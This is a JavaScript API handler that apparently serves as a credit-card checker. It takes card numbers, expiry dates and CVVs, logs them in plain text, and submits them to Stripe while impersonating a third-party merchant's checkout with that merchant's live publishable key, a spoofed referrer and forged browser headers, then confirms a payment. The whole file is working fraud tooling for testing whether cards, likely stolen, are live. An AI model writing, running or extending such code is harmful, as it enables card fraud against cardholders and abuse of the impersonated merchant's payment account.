import { getStripeData, confirm_payment } from "./helpers/functions"


export default async function handler(req, res) {

    const { ccn, em, ey, cvv } = req.body

    if (!ccn || !em || !ey || !cvv) {
        res.status(200).json({ card: "invalid sended or not sended , please chech request body , ccn , em , ey , cvv" })
    }

    const startTime = performance.now();

    try {

        const stripe_data = await getStripeData()

        console.log(`-------------------------------------------------`)

        console.log(`\n ✔ ccn  : ${ccn}\n ✔ em   : ${em}\n ✔ ey   : ${ey}\n ✔ cvv  : ${cvv} `)

        console.log(`\n ✔ muid : ${stripe_data.muid}\n ✔ guid : ${stripe_data.guid}\n ✔ sid  : ${stripe_data.sid} `)

        const urlencoded = new URLSearchParams();
        urlencoded.append("type", "card");
        urlencoded.append("card[number]", ccn);
        urlencoded.append("card[cvc]", cvv);
        urlencoded.append("card[exp_year]", ey);
        urlencoded.append("card[exp_month]", em);
        urlencoded.append("allow_redisplay", "unspecified");
        urlencoded.append("billing_details[address][country]", "IN");
        urlencoded.append("pasted_fields", "number");
        urlencoded.append("payment_user_agent", "stripe.js/2d85ec0669;stripe-js-v3/2d85ec0669;payment-element");
        urlencoded.append("referrer", "https://www.veed.io");
        urlencoded.append("time_on_page", "2483775");
        urlencoded.append("client_attribution_metadata[client_session_id]", "7fab8189-a7dc-472a-88fd-5c0282f0cf46");
        urlencoded.append("client_attribution_metadata[merchant_integration_source]", "elements");
        urlencoded.append("client_attribution_metadata[merchant_integration_subtype]", "payment-element");
        urlencoded.append("client_attribution_metadata[merchant_integration_version]", "2021");
        urlencoded.append("client_attribution_metadata[payment_intent_creation_flow]", "standard");
        urlencoded.append("client_attribution_metadata[payment_method_selection_flow]", "merchant_specified");
        urlencoded.append("guid", stripe_data.guid);
        urlencoded.append("muid", stripe_data.muid);
        urlencoded.append("sid", stripe_data.sid);
        urlencoded.append("key", "pk_live_l1BFAH6I4rWpV6dIqwAZxy3f");

        const response = await fetch("https://api.stripe.com/v1/payment_methods", {
            "headers": {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "content-type": "application/x-www-form-urlencoded",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"128\", \"Not;A=Brand\";v=\"24\", \"Brave\";v=\"128\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "sec-gpc": "1",
                "Referer": "https://js.stripe.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            "body": urlencoded,
            "method": "POST"
        });

        const response_json = await response.json()

        // console.log(response_json)

        const pm = response_json.id

        // console.log(response_json)
        console.log(`\n ✔ pm   : ${pm}`)

        const con_payment = await confirm_payment(pm, startTime)

        res.status(200).json(con_payment)
    } catch (error) {
        res.status(500).json(error)
    }

}